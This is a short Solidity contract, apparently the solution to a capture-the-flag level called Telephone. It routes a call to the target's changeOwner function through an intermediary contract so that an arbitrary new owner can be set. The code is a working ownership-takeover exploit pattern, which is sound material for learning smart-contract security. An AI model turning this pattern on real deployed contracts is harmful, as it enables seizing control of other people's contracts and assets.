// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract TelephoneSolved {
  Telephone public telephone;

  constructor(address _telephone) public {
    telephone = Telephone(_telephone);
  }

  function claim(address _newOwner) public {
    telephone.changeOwner(_newOwner);
  }
}